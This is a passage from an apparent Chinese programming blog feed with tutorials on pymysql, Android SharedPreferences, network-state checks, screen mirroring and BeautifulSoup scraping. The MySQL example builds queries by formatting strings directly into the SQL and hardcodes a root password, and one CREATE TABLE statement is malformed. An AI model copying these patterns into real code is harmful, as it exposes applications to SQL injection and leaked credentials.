<h5 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">conn = pymysql.connect(host = <span class="string">'localhost'</span>, </div><div class="line">                       user = <span class="string">'你的用户名'</span>,</div><div class="line">                       passwd = <span class="string">'你的密码'</span>,</div><div class="line">                       charset=<span class="string">'utf8'</span>)  <span class="comment">#得到连接对象</span></div><div class="line">cur=conn.cursor()   <span class="comment">#得到游标对象</span></div><div class="line">cur.execute(<span class="string">"USE school"</span>)   <span class="comment">#指定使用哪个数据库</span></div></pre></td></tr></table></figure>
<h5 id="插入、查询等基本操作"><a href="#插入、查询等基本操作" class="headerlink" title="插入、查询等基本操作"></a>插入、查询等基本操作</h5><ul>
<li>创建表：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">cur.execute(<span class="string">"CREATE TABLE student (id TINYINT, Sno VARCHAR(255) UNIQUE KEY, )"</span>)</div></pre></td></tr></table></figure>
<ul>
<li>插入数据：</li>
</ul>
<p>　　方式一：直接赋值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">cur.execute(<span class="string">"INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES ('20160001', 'xxx', 20, '男')"</span>)</div><div class="line">conn.commit()   <span class="comment">#更改数据后需进行提交</span></div></pre></td></tr></table></figure>
<p>　　方式二：由变量赋值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">Sno = <span class="string">'20160004'</span></div><div class="line">Sname = <span class="string">'lll'</span></div><div class="line">Sage = <span class="string">'20'</span></div><div class="line">Ssex = <span class="string">'男'</span></div><div class="line">cur.execute(<span class="string">"INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES (\"%s\",\"%s\",\"%s\",\"%s\")"</span>%(Sno, Sname, Sage, Ssex))</div><div class="line">conn.commit()   <span class="comment">#更改数据后需进行提交</span></div></pre></td></tr></table></figure>
<ul>
<li>查询数据：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">cur.execute(<span class="string">"SELECT * FROM Student"</span>)</div></pre></td></tr></table></figure>
<ul>
<li>打印查询结果：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">print</span> cur.fetchone()    <span class="comment">#打印第一条查询结果</span></div><div class="line"><span class="keyword">print</span> cur.fetchall()    <span class="comment">#打印所有查询结果</span></div></pre></td></tr></table></figure>
<h5 id="关闭连接"><a href="#关闭连接" class="headerlink" title="关闭连接"></a>关闭连接</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line">cur.close()</div><div class="line">conn.close()</div></pre></td></tr></table></figure>
<h4 id="完整示例"><a href="#完整示例" class="headerlink" title="完整示例"></a>完整示例</h4><p>　　创建一张学生表，有 id，学号、姓名、年龄、性别 5 列，然后插入 4 条数据，在进行查询并打印所有查询结果。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf8 -*-</span></div><div class="line"><span class="keyword">import</span> pymysql</div><div class="line"></div><div class="line">conn = pymysql.connect(host = <span class="string">'localhost'</span>, </div><div class="line">                       user = <span class="string">'root'</span>,</div><div class="line">                       passwd = <span class="string">'fzy1686'</span>,</div><div class="line">                       charset=<span class="string">'utf8'</span>)</div><div class="line"></div><div class="line">cur=conn.cursor()</div><div class="line">cur.execute(<span class="string">"USE school"</span>)</div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line">    cur.execute(<span class="string">"CREATE TABLE Student (id BIGINT(10) NOT NULL AUTO_INCREMENT,\</span></div><div class="line">                                       Sno VARCHAR(20) NOT NULL,\</div><div class="line">                                       Sname VARCHAR(20) NOT NULL,\</div><div class="line">                                       Sage VARCHAR(10) NOT NULL,\</div><div class="line">                                       Ssex VARCHAR(10) DEFAULT '男',\</div><div class="line">                                       PRIMARY KEY(id))")</div><div class="line">    </div><div class="line">    cur.execute(<span class="string">"INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES ('20160001', 'xxx', 20, '男')"</span>)</div><div class="line">    cur.execute(<span class="string">"INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES ('20160002', 'yyy', 18, '女')"</span>)</div><div class="line">    cur.execute(<span class="string">"INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES ('20160003', 'zzz', 22, '女')"</span>)</div><div class="line">    </div><div class="line">    Sno = <span class="string">'20160004'</span></div><div class="line">    Sname = <span class="string">'lll'</span></div><div class="line">    Sage = <span class="string">'20'</span></div><div class="line">    Ssex = <span class="string">'男'</span></div><div class="line">    cur.execute(<span class="string">"INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES (\"%s\",\"%s\",\"%s\",\"%s\")"</span>%(Sno, Sname, Sage, Ssex))   </div><div class="line">    conn.commit()</div><div class="line">        </div><div class="line">    cur.execute(<span class="string">"select * from Student"</span>)</div><div class="line">    <span class="keyword">print</span> cur.fetchall()</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    cur.close()</div><div class="line">    conn.close()</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 数据存储之 SharedPreferences</title>
    <url>/2016/07/21/Android%20%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E4%B9%8B%20SharedPreferences/</url>
    <content><![CDATA[<p>　　SharedPreferences 是一种轻型的数据存储方式，它的本质是基于 xml 文件存储的 key-value 键值对数据，它的使用非常简单,能够轻松的存放数据和读取数据。App 都有相应的配置文件，但是由于 App 的配置信息并不多，如果采用数据库来存放并不划算，因为数据库连接跟操作等耗时大大影响了程序的效率，因此通常使用 SharedPreferences 来存储一些简单的配置信息。</p>
<a id="more"></a>
<h4 id="使用SharedPreferences保存数据"><a href="#使用SharedPreferences保存数据" class="headerlink" title="使用SharedPreferences保存数据"></a>使用SharedPreferences保存数据</h4><h5 id="获得SharedPreferences对象"><a href="#获得SharedPreferences对象" class="headerlink" title="获得SharedPreferences对象"></a>获得SharedPreferences对象</h5><p>　　使用 getSharedPreferences 方法得到 SharedPreferences 对象，该方法有两个参数，第一个参数是文件名，第二个参数是权限模式。文件名不需要加后缀，系统在生成该文件时会自动加上 .xml 后缀。</p>
<p>　　SharedPreferences 的四种操作模式:</p>
<ul>
<li><p><strong>Context.MODE_PRIVATE：</strong>为默认操作模式,代表该文件是私有数据,只能被应用本身访问,在该模式下,写入的内容会覆盖原文件的内容。</p>
</li>
<li><p><strong>Context.MODE_APPEND：</strong>模式会检查文件是否存在,存在就往文件追加内容,否则就创建新文件。</p>
</li>
</ul>
<p>　　Context.MODE_WORLD_READABLE和Context.MODE_WORLD_WRITEABLE用来控制其他应用是否有权限读写该文件.</p>
<ul>
<li><p><strong>Context.MODE_WORLD_READABLE：</strong>表示当前文件可以被其他应用读取.</p>
</li>
<li><p><strong>Context.MODE_WORLD_WRITEABLE：</strong>表示当前文件可以被其他应用写入.</p>
</li>
</ul>
<h5 id="获取Editor对象，并使用相应的方法来创建、修和清除数据"><a href="#获取Editor对象，并使用相应的方法来创建、修和清除数据" class="headerlink" title="获取Editor对象，并使用相应的方法来创建、修和清除数据"></a>获取Editor对象，并使用相应的方法来创建、修和清除数据</h5><p>　　调用该 SharedPreferences 对象的 Editor 接口得到一个 Editor 对象，使用该对象有 putInt，putString 等putXxx 方法来存储键值对信息，通过 remove() 方法来移除一个键值对，或者通过 clear() 方法来清除数据等。</p>
<h5 id="使用commit-方法提交数据。"><a href="#使用commit-方法提交数据。" class="headerlink" title="使用commit()方法提交数据。"></a>使用commit()方法提交数据。</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">SharedPreferences sharedPreferences = getSharedPreferences(<span class="string">"mysp"</span>,Context.MODE_PRIVATE);</div><div class="line">Editor editor=sharedPreferences.edit();</div><div class="line">editor.putString(<span class="string">"name"</span>, <span class="string">"fzy"</span>);</div><div class="line">editor.putString(<span class="string">"age"</span>, <span class="string">"22"</span>);</div><div class="line">editor.commit();    <span class="comment">//提交数据</span></div></pre></td></tr></table></figure>
<p>　　记得每次更改数据后都要调用 editor 对象的 commit() 方法提交数据，执行以上代码后，SharedPreferences将会把这些数据保存在 mysp.xml 文件中，可以打开 eclipse 的 DDMS 工具在 File Explorer 的 data/data/ 相应的包名 /shared_prefs/mysp.xml 下导出该文件，并查看。（如下图红色箭头标注）</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/7/21-1.jpg" alt="21-1"></p>
<p>　　我们可以将此 xml 文件导出来看看，点击右上角 pull a file from the device (如下图蓝色箭头标注)</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/7/21-2.jpg" alt="21-2"></p>
<h4 id="从SharedPreferences获取数据"><a href="#从SharedPreferences获取数据" class="headerlink" title="从SharedPreferences获取数据"></a>从SharedPreferences获取数据</h4><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">SharedPreferences sharedPreferences=getSharedPreferences(<span class="string">"mysp"</span>, Context.MODE_PRIVATE);</div><div class="line">String name=sharedPreferences.getString(<span class="string">"name"</span>, <span class="string">"defaultname"</span>);</div><div class="line">String age=sharedPreferences.getString(<span class="string">"age"</span>, <span class="string">"0"</span>);</div><div class="line">System.out.println(<span class="string">"name: "</span>+ name + <span class="string">",age: "</span> + age);</div></pre></td></tr></table></figure>
<p>　　取出结果如下：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/7/21-3.jpg" alt="21-3"></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>SharedPreferences</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 真机抓屏 - Android Screen Monitor</title>
    <url>/2016/07/21/Android%20%E7%9C%9F%E6%9C%BA%E6%8A%93%E5%B1%8F%20-%20Android-Screen-Monitor/</url>
    <content><![CDATA[<p>　　最近遇到一个比较尴尬的问题，博客需要做一个Android手机网络状态检测的操作演示gif动图，虽然找到一款可以在电脑上录屏并自动生成gif文件的软件，但是eclipse自带的模拟器又不能切换到GPRS网络，于是，想着将真机的屏幕分享到电脑再进行录屏操作，试了华为助手和360助手，但是他们都需要全屏演示，不能很好的结合我的录屏软件，于是又百度找了找，最后还真有个小工具可以实现真机抓屏，反应还挺快，这就是Android Screen Monitor。</p>
<a id="more"></a>
<h4 id="ASM简介"><a href="#ASM简介" class="headerlink" title="ASM简介"></a>ASM简介</h4><p>　　Android Screen Monitor，简称为 ASM，它是一个监视设备或模拟器屏幕的工具，ASM 是 ADB调试桥的客户端应用程序，当 ASM 开始监控屏幕的时候，它通过 5037 端口连接至 ADB，不断地把所监控设备的屏幕数据保存在帧缓存中并且把图像数据转换成用户可观测的内容。</p>
<h4 id="ASM使用方法"><a href="#ASM使用方法" class="headerlink" title="ASM使用方法"></a>ASM使用方法</h4><ol>
<li>确保你的手机可以进行真机调试</li>
</ol>
<p>　　一般我们只要将手机通过 USB 连接上电脑，并打开 USB 调试，允许电脑控制我们的手机，然后将项目运行看是否能够运行在我们的真机。</p>
<ol>
<li>ASM 下载。</li>
</ol>
<p>　　最新版本是 2.5，下载地址：<a href="https://code.google.com/p/android-screen-monitor/downloads/list" target="_blank" rel="external">https://code.google.com/p/android-screen-monitor/downloads/list</a></p>
<p>　　貌似要翻墙才能下载，不想翻墙单的话可以私聊我。</p>
<ol>
<li><p>解压后文件夹中的 asm.jar 复制到 Android SDK 的 platform-tools 目录下。</p>
</li>
<li><p>打开 ASM。</p>
</li>
</ol>
<p>　　方法一：打开 cmd，进入到 Android SDK 的 platform-tools 目录，然后输入如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">java -jar asm.jar</div></pre></td></tr></table></figure>
<p>　　方法二：直接双击Android SDK的platform-tools目录下的asm.jar文件</p>
<ol>
<li>进入选择界面，选择我们的手机。</li>
</ol>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/7/20-1.jpg" alt="20-1"></p>
<ol>
<li>进行相关配置</li>
</ol>
<p>　　可右键选择调整窗体大小。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/7/20-2.jpg" alt="20-2"></p>
<p>　　至此，我们就实现了将自己的手机屏幕分享到电脑的功能，赶快来体验一下反应快、画面流畅的 Android Screen Monitor 吧。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Screen Monitor</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 网络状态检查总结</title>
    <url>/2016/07/20/Android%20%E7%BD%91%E7%BB%9C%E7%8A%B6%E6%80%81%E6%A3%80%E6%9F%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>　　几乎每个具有连网功能的 App 都会有网络检测代码专门负责网络检测，需要实时检测网络是否可用，当出现网络不可用或者无连接时提示用户，当需要观看视频时自动检测是否处于 wifi 网络，并提示用户避免带来大量的流量消耗，所有的这些功能都是为了使 App 的用户体验更好。此篇博客主要介绍检测网络状态的相关方法，并通过一个小例子来实现实时的网络状态检测。</p>
<a id="more"></a>
<h4 id="添加权限"><a href="#添加权限" class="headerlink" title="添加权限"></a>添加权限</h4><p>　　在 AndroidManifest.xml 文件添加：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.ACCESS_NETWORK_STATE"</span>/&gt;</span>  </div><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span>/&gt;</span></div></pre></td></tr></table></figure>
<h4 id="编写相应的检测方法"><a href="#编写相应的检测方法" class="headerlink" title="编写相应的检测方法"></a>编写相应的检测方法</h4><h5 id="判断网络是否可用的方法"><a href="#判断网络是否可用的方法" class="headerlink" title="判断网络是否可用的方法"></a>判断网络是否可用的方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isNetworkAvailable</span><span class="params">(Context context)</span> </span>&#123;</div><div class="line">    ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);</div><div class="line">    <span class="keyword">if</span> (mConnectivityManager != <span class="keyword">null</span>) &#123;</div><div class="line">        NetworkInfo mNetworkinfo = mConnectivityManager.getActiveNetworkInfo();</div><div class="line">        <span class="keyword">if</span> (mNetworkinfo != <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">return</span> mNetworkinfo.isAvailable();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="判断WIFI网络是否连接上的方法"><a href="#判断WIFI网络是否连接上的方法" class="headerlink" title="判断WIFI网络是否连接上的方法"></a>判断WIFI网络是否连接上的方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isWifiConnected</span><span class="params">(Context context)</span> </span>&#123;</div><div class="line"></div><div class="line">    ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);</div><div class="line">    <span class="keyword">if</span> (mConnectivityManager != <span class="keyword">null</span>) &#123;</div><div class="line">        NetworkInfo mWiFiNetworkInfo = mConnectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);</div><div class="line">        <span class="keyword">if</span> (mWiFiNetworkInfo != <span class="keyword">null</span> &amp;&amp; mWiFiNetworkInfo.isConnected()) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="判断GPRS网络是否连接上的方法"><a href="#判断GPRS网络是否连接上的方法" class="headerlink" title="判断GPRS网络是否连接上的方法"></a>判断GPRS网络是否连接上的方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isMobileConnected</span><span class="params">(Context context)</span> </span>&#123;</div><div class="line"></div><div class="line">    ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);</div><div class="line">    <span class="keyword">if</span> (mConnectivityManager != <span class="keyword">null</span>) &#123;</div><div class="line">        NetworkInfo mMobileNetworkInfo = mConnectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);</div><div class="line">        <span class="keyword">if</span> (mMobileNetworkInfo != <span class="keyword">null</span> &amp;&amp; mMobileNetworkInfo.isConnected()) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="获取所连接网络的类型的方法"><a href="#获取所连接网络的类型的方法" class="headerlink" title="获取所连接网络的类型的方法"></a>获取所连接网络的类型的方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getNetworkType</span><span class="params">(Context context)</span> </span>&#123;</div><div class="line">    ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);</div><div class="line">    <span class="keyword">if</span> (mConnectivityManager != <span class="keyword">null</span>) &#123;</div><div class="line">        NetworkInfo mNetworkinfo = mConnectivityManager.getActiveNetworkInfo();</div><div class="line">        <span class="keyword">if</span> (mNetworkinfo != <span class="keyword">null</span> &amp;&amp; mNetworkinfo.isAvailable()) &#123;</div><div class="line">            String info = <span class="string">"Type: "</span> + mNetworkinfo.getType() + <span class="string">"    Name: "</span>+ mNetworkinfo.getTypeName();</div><div class="line">            <span class="keyword">return</span> info;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="string">"网络无连接，请检查网络"</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<h4 id="实现网络状态监测"><a href="#实现网络状态监测" class="headerlink" title="实现网络状态监测"></a>实现网络状态监测</h4><p>　　使用 Service+BroadcastReceiver 来实现相应的功能。</p>
<h5 id="编写网络状态检测类"><a href="#编写网络状态检测类" class="headerlink" title="编写网络状态检测类"></a>编写网络状态检测类</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NetState</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</div><div class="line">        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">        ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);</div><div class="line">        <span class="keyword">if</span> (mConnectivityManager != <span class="keyword">null</span>) &#123;</div><div class="line">            NetworkInfo mMobileNetworkInfo = mConnectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);</div><div class="line">            NetworkInfo mWiFiNetworkInfo = mConnectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);</div><div class="line">            </div><div class="line">            <span class="keyword">if</span> (!mMobileNetworkInfo.isConnected()&amp;&amp; !mWiFiNetworkInfo.isConnected()) &#123;</div><div class="line">                Toast.makeText(context, <span class="string">"网络连接断开，请检查网络"</span>, Toast.LENGTH_SHORT).show();</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                Toast.makeText(context, <span class="string">"网络连接成功"</span>, Toast.LENGTH_SHORT).show();</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="在Activity的onCreate方法中注册监听"><a href="#在Activity的onCreate方法中注册监听" class="headerlink" title="在Activity的onCreate方法中注册监听"></a>在Activity的onCreate方法中注册监听</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line">NetState mNetState = <span class="keyword">new</span> NetState();    <span class="comment">//获取网络监听实例</span></div><div class="line">IntentFilter mFilter = <span class="keyword">new</span> IntentFilter(); <span class="comment">//获取意图过滤器实例</span></div><div class="line">mFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION); <span class="comment">//过滤Action，使只监听网络动作事件的广播</span></div><div class="line"><span class="keyword">this</span>.registerReceiver(mNetState, mFilter);  <span class="comment">//注册广播接收器</span></div><div class="line">mNetState.onReceive(<span class="keyword">this</span>, <span class="keyword">null</span>);    <span class="comment">//调用广播接收方法</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 爬虫利器 - BeautifulSoup</title>
    <url>/2016/07/17/Python%20%E7%88%AC%E8%99%AB%E5%88%A9%E5%99%A8%20-%20BeautifulSoup/</url>
    <content><![CDATA[<p>　　Beautiful Soup 提供一些简单的、python 式的函数用来处理导航、搜索、修改分析树等功能。它是一个工具箱，通过解析文档为用户提供需要抓取的数据，因为简单，所以不需要多少代码就可以写出一个完整的应用程序。</p>
<a id="more"></a>
<h4 id="BeautifulSoup4安装"><a href="#BeautifulSoup4安装" class="headerlink" title="BeautifulSoup4安装"></a>BeautifulSoup4安装</h4><p>　　由于 BeatifulSoup 库不是 Python 标准库，因此需要单独安装。</p>
<h5 id="在Linux系统上安装"><a href="#在Linux系统上安装" class="headerlink" title="在Linux系统上安装"></a>在Linux系统上安装</h5><figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash">sudo apt-get install python-bs4</span></div></pre></td></tr></table></figure>
<h5 id="在Windows系统安装"><a href="#在Windows系统安装" class="headerlink" title="在Windows系统安装"></a>在Windows系统安装</h5><p>　　可以利用 pip 或者 easy_install 来安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">pip install beautifulsoup4</div></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">easy_install beautifulsoup4</div></pre></td></tr></table></figure>
<h4 id="Beautifulsoup4使用"><a href="#Beautifulsoup4使用" class="headerlink" title="Beautifulsoup4使用"></a>Beautifulsoup4使用</h4><h5 id="导入库"><a href="#导入库" class="headerlink" title="导入库"></a>导入库</h5><p>（1）导入网络请求库</p>
<p>　　Python2.x 里的 urllib2 与 urllib 有些不同，在 Python3.x 里，urllib2 改名为 urllib，被分成一些子模块：<code>urllib.request</code>、<code>urllib.parse</code>、<code>urllib.error</code>。所以不同的版本使用时略有区别。</p>
<p>　　Python3.x 版本：<br><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</div></pre></td></tr></table></figure></p>
<p>　　Python2.x 版本：<br><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> urlopen</div></pre></td></tr></table></figure></p>
<p>（2）导入Beautifulsoup4<br><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div></pre></td></tr></table></figure></p>
<h5 id="运行Beautifulsoup"><a href="#运行Beautifulsoup" class="headerlink" title="运行Beautifulsoup"></a>运行Beautifulsoup</h5><p>　　首先我准备了一个简单的测试页面，网址是：<code>blog.line-coding.tech</code>，页面的结构如下。可以看到我们的 img 标签在红色箭头标注的位置，我们通过代码一步步的去获取中心 404 图片的 url 地址，如下：</p>
<p><img src="http://ohe7ixo05.bkt.clouddn.com/2016/7/17-1.jpg" alt="17-1"></p>
<p>　　Python3.x 版本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line">html = urlopen(<span class="string">"http://blog.line-coding.com"</span>)</div><div class="line">bsObj = BeautifulSoup(html.read())</div><div class="line">print(bsObj.body)</div><div class="line">print(bsObj.body.div)</div><div class="line">print(bsObj.body.div.div)</div><div class="line">print(bsObj.body.div.div.img)</div><div class="line">print(bsObj.body.div.div.img[<span class="string">'src'</span>])</div></pre></td></tr></table></figure>
<p>　　Python2.x 版本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line">html = urllib.urlopen(<span class="string">"http://blog.line-coding.com"</span>)</div><div class="line">bsObj = BeautifulSoup(html,<span class="string">"html.parser"</span>)</div><div class="line"><span class="keyword">print</span> bsObj.body    <span class="comment">#得到body标签的内容</span></div><div class="line"><span class="keyword">print</span> bsObj.body.div    <span class="comment">#得到body标签下div标签的内容</span></div><div class="line"><span class="keyword">print</span> bsObj.body.div.div    <span class="comment">#得到body标签下div标签下的div标签的内容</span></div><div class="line"><span class="keyword">print</span> bsObj.body.div.div.img    <span class="comment">#得到img标签的内容</span></div><div class="line"><span class="keyword">print</span> bsObj.body.div.div.img[<span class="string">'src'</span>]    <span class="comment">#得到图片url地址</span></div></pre></td></tr></table></figure>
<p>　　结果如下：</p>
<p><img src="http://ohe7ixo05.bkt.clouddn.com/2016/7/17-2.jpg" alt="17-2"></p>
<p>　　有了 Beautiful4，我们就可以将网页代码转换成一个对象，并通过再通过.号去访问这个对象的信息，一级一级的去查找来所需的信息。接下来的博客中，我会使用 Beautiful4 来进行数据爬取，敬请关注。</p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>BeautifulSoup</tag>
      </tags>
  </entry>
  <entry>
    <title>Android ip 地址信息查询</title>
    <url>/2016/07/12/Android%20ip%20%E5%9C%B0%E5%9D%80%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<p>　　上一篇博客中我们讲解了如何获取外网的 ip 地址，获取到的 ip 地址总是会有用的，我们现在就来使用它，通过查询 ip 地址的相关信息我们可以获取当前所在城市信息，即 ip 地址定位。其实，实现起来也比较简单，主要还是使用的第三方 API 接口，通过 http 请求来获取信息。</p>
<a id="more"></a>
<h4 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h4><h5 id="百度API-Store-Ip地址定位API的使用"><a href="#百度API-Store-Ip地址定位API的使用" class="headerlink" title="百度API Store Ip地址定位API的使用"></a>百度API Store Ip地址定位API的使用</h5><p>　　上一步我们获取了本机的外网 ip 地址，然后我们使用百度 API Store 的 ip 地址定位 API 来进行 ip 地址定位。<a href="http://apistore.baidu.com/apiworks/servicedetail/114.html" target="_blank" rel="external">API的地址</a>，他有很详细的文档，可以很容易使用。通过 Http 的 GET 方法将 ip 地址发送给服务器，将获取 JSON 格式的返回值进行解析即可实现定位。如下图所示：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/7/12-1.jpg" alt="12-1"></p>
<h5 id="android-async-http"><a href="#android-async-http" class="headerlink" title="android-async-http"></a>android-async-http</h5><p>　　android-async-http 是一个第三方网络请求库，由于在上一篇博客中我们已经为工程添加 android-async-http 的 jar 包，所以这里不需要重复添加，可直接进入下一步。</p>
<h4 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h4><h5 id="Handler"><a href="#Handler" class="headerlink" title="Handler"></a>Handler</h5><p>　　新建一个 Handler 用于将 Http 请求获得的定位数据传回 Activity：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">private</span> Handler mCityHandler = <span class="keyword">new</span> Handler() &#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(Message msg)</span> </span>&#123;</div><div class="line">        String res = (String) msg.obj; <span class="comment">//获取传回的定位数据</span></div><div class="line">        res = decodeUnicode(res);</div><div class="line">        System.out.println(res); </div><div class="line">        mAddr.setText(res); <span class="comment">//显示ip地址定位信息</span></div><div class="line">        <span class="comment">//也可以进一步解析JSON数据取出所在国家、省份、城市等信息</span></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            JSONObject js = <span class="keyword">new</span> JSONObject(res);</div><div class="line">            js = js.getJSONObject(<span class="string">"retData"</span>);</div><div class="line">            String country = js.getString(<span class="string">"country"</span>);</div><div class="line">            String province = js.getString(<span class="string">"province"</span>);</div><div class="line">            String city = js.getString(<span class="string">"city"</span>);</div><div class="line">            System.out.println(<span class="string">"city:"</span> + city);</div><div class="line">        &#125; <span class="keyword">catch</span> (JSONException e) &#123;</div><div class="line">            <span class="comment">// TODO Auto-generated catch block</span></div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125;;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h5 id="Http-请求"><a href="#Http-请求" class="headerlink" title="Http 请求"></a>Http 请求</h5><p>　　在 IpHttpUtil 类中编写 Http 请求静态方法，这里还是使用的 android-async-http 网络请求库，因为它方便、简洁，而且稳定，所以一直喜欢用它。</p>
